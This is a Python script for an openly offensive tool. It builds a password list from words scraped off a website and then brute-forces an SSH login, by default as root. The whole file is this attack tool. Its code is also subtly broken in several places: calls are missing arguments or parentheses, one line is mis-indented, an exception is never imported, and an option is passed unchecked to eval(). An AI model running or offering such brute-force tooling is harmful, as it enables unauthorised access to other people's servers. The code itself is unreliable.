import getopt
import sys
from collections import Counter
import time

from bs4 import BeautifulSoup
import requests
import paramiko

# ---------------------------------------------------------------- 
# class ScrapedSite - container class for BeautifulSoup object
# ---------------------------------------------------------------- 
class ScrapedSite:

    # available transforms for words scraped from the site
    transforms = {
        'lower' : lambda x: [x.lower()],
        'upper' : lambda x: [x.upper()],
        'dualcase'  : lambda x: [x[0].upper() + x[1:], x[0].lower() + x[1:]]
    }

    def __init__(self, rooturl, recursive=False, local=False, transform=(lambda x: x.lower()):
        self.rooturl = rooturl.lower()
        try:
            if local:
                self.roottext = open(self.rooturl).read()
            else:
                self.roottext = requests.get().text
        except Exception as e:
            print("HTML Read Error: %s" % e)
        soup = BeautifulSoup(self.roottext)
        self.wordlist = Counter()
        for word in soup.get_text.split(" "):
            self.wordlist.update(transform(word))
        
        if recursive:
            hrefs = [self.rooturl] + [link.get('href').lower() for link in soup.find_all("a") if link.get('href').lower() != self.rooturl]
            counter = 0
            while counter < len(hrefs):
                href = hrefs[counter]
                subsoup = BeautifulSoup(href)
                for word in subsoup.get_text.split(" "):
                    self.wordlist.update(transform(word))
                hrefs += [link.get('href').lower() for link in subsoup.find_all("a") if link.get('href').lower() not in hrefs]
                counter += 1

# function to brute-force a given ssh login
def ssh_break(ip, wordlist, sleep=0.5, user="root", port=22):
    client = paramiko.SSHClient()
    for word in wordlist:
        try:
            client.connect(ip, port=port, username=user, password=word)
        except AuthenticationException as e:
            time.sleep(sleep)   
        else:
            client.close()
            return word

def main():
    try:
    opts, args = getopt.getopt(sys.argv[1:], "hrlt:s:u:p:")
        assert len(args) == 2, "Wrong number of arguments"

        # Keyword argument dictionaries for SiteScraper object and ssh_break function
        siteargs = {}
        sshargs = {}
        for o, a in opts:
            if o == "-h":
                print_help()
                exit()
            elif o == "-r":
                siteargs['recursive'] = True
            elif o == "-l":
                siteargs['local'] = True
            elif o == "-t":
                siteargs['transform'] = eval(a)   
            elif o == "-s":
                sshargs['sleep'] = float(a)
            elif o == "-u":
                sshargs['user'] = a
            elif o == "-p":
                sshargs['port'] = int(a)

        rooturl, ssh_ip = args

        site = ScrapedSite(rooturl, **siteargs)
        
        password = ssh_break(ssh_ip, sorted(site.wordlist, key=site.wordlist.get, reverse=True), **sshargs)

        if password:
            print("Password Cracked! The password for user %s is %s" % (sshargs.get('user', "root"), password))
        else:
            print("Password not found.")

    except Exception as e:
        print("Error! %s" % e)
        print_help()

def print_help():
    print(open("help.txt"))

if __name__ == "__main__":
    main()
